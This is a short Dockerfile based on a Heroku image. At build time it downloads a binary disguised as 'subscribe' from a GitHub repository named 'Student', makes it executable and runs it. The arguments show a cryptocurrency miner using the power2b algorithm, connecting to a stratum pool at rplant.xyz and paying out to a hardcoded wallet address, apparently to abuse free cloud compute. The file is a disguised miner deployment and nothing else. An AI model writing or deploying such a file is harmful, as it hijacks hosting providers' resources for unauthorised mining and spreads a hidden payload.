FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/mrbogel/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MXk1jV3jVgb6kvP9B9VMVbzqR4BHRq7vGb.siMerah
CMD bash heroku.sh
